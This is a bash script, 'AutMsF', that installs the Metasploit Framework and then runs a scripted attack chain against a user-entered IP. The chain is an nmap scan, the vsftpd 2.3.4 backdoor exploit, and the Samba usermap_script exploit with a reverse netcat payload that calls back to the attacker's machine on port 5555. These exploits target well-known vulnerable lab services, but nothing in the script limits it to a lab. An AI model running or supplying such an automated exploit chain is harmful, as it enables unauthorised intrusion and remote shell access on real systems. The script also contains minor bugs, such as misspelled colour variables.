#!/bin/bash

#colors defined, will be used in script
red='\e[1;31m'
cyan='\e[0;36m'
yellow='\e[0;33m'
orange='\e[38;5;166m'
lightgreen='\e[1;32m'
RESET="\033[00m"


#function to check if user is root or not
function isroot_(){
	if [ $EUID -ne 0 ]; then
		echo -e $red
		echo "[!] Run this script as Root User."
		exit 1
	else
		echo -e $lightgreen
		echo "[!] Root Level Privileges Available."
		clear 
	fi
}
#=============================================================================================


#function to display banner
function banner_(){
	echo -e $cyan
	echo """
    _         _   __  __     _____ 
   / \  _   _| |_|  \/  |___|  ___|
  / _ \| | | | __| |\/| / __| |_   
 / ___ \ |_| | |_| |  | \__ \  _|  
/_/   \_\__,_|\__|_|  |_|___/_|      
				Version: 1.0 """
}
#=============================================================================================


#quit function, for exiting script
function quit_(){ 
	echo -e $red
	echo "[!] Quitting."
	sleep 3 && clear 
	exit 1
}
#=============================================================================================


function menu_(){
	echo -e $lightgreen && sleep 2
   	echo """
   		--------------------------------------------
   	       |    	   A  u  T   M  S  F		    |
   		--------------------------------------------
   	       | [+] I. Install MSF Framework               |
   	       |					    |
   	       | [+] R. Run MSF Framewor		    |
   	       |		                            |
   	       | [+] Q. Quit                                |
   	       |					    |
   	        -------------------------------------------- 
   	"""
}
#=============================================================================================


function instalrun_(){
	echo -e $cyan
	apt-get update -y
	apt-get update -y
	
	apt-get install gpgv2 autoconf bison build-essential postgresql libaprutil1 libgmp3-dev libpcap-dev openssl libpq-dev libreadline6-dev libsqlite3-dev libssl-dev locate libsvn1 libtool libxml2 libxml2-dev libxslt-dev wget libyaml-dev ncurses-dev  postgresql-contrib xsel zlib1g zlib1g-dev -y
	
	apt-get install gem build-essential libreadline-dev  libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev openjdk-7-jre subversion git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer libyaml-dev ruby-bundler ruby-full -y
	
	echo -e $lightgreen
	echo "[*] Downloading Metasploit Framework"
	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
	ls -la msfinstall
	chmod +x msfinstall
	
	echo -e orange
	echo "[!] Installing Metasploit Framework."
	./msfinstall
	echo -e lightgreen
	echo "[!] Metasploit Framework is Installed."
	
	sleep 3 && clear
	mainf_
}
#=============================================================================================


#function for automating metasploit vulnsec scan
function msfaut_(){
	echo -e $orange
	echo "------------------------ Scanning Server Open Ports ------------------------"
	echo ""
	read -p "Enter Target IP Address: " targ
	
	#metasploit command to automate nmap scan for our target server 
	msfconsole -q -x " nmap -T4 -A -v $targ;
	exit;"
	sleep 5
	echo ""
	echo ""
	echo "[!] Nmap Scan for $targ is Completed."
	echo ""
	sleep 15 
	
	echo -e $yellow
	echo "------------------------ Scanning & Exploiting Server for VSTPD Vulnerability ------------------------"
	echo ""
	
	#metasploit automation of vstpd exploitation
	msfconsole -q -x " use exploit/unix/ftp/vsftpd_234_backdoor;
	set RHOSTS $targ;
	run;
	exit;"
	sleep 5
	echo ""
	echo "[!] Exploitation of VSTPD Vulnerability Completed."
	sleep 15 
	
	echo -e $cyan
	echo "------------------------ Scanning & Exploiting Server for SAMBA Vulnerability ------------------------"
	echo ""
	read -p "Enter IP Address of Your Machine: " own
	
	#metasploit automation for smaba vulnerability exploitation
	msfconsole -q -x " use exploit/multi/samba/usermap_script;
	set RHOSTS $targ;
	set PAYLOAD cmd/unix/reverse_netcat;
	set LHOST $own;
	set LPORT 5555;
	show options;
	run;
	exit;"
	sleep 5
	echo ""
	echo "[!] Exploitation of SAMBA Vulnerability Completed."
	sleep 15 
	
	mainf_	
}
#=============================================================================================


#main function of script/tool
#execution will start by calling main function
function mainf_(){
	isroot_
	banner_
	
	#logfile variable with location for troubleshooting
	LOGFILE="/tmp/msfinstall$NOW.log"
	
	menu_
	
	echo -e $oragne
	read -p "[!] Enter Operation to Perfrom: " opt

	if [ "$opt" == "I" ]; then
		sleep 2
		echo -e $yellow
		instalrun_
	
	elif [ "$opt" == "R" ]; then
		msfaut_
		
	elif [ "$opt" == "Q" ]; then
		quit_
	
	else
		echo -e $red
		echo "[!] Incorrect Operation Performed."
		exit 1
	fi
}
#installing from github will take long time than installing directly from source code
#=============================================================================================


mainf_
#ENDOFCODE
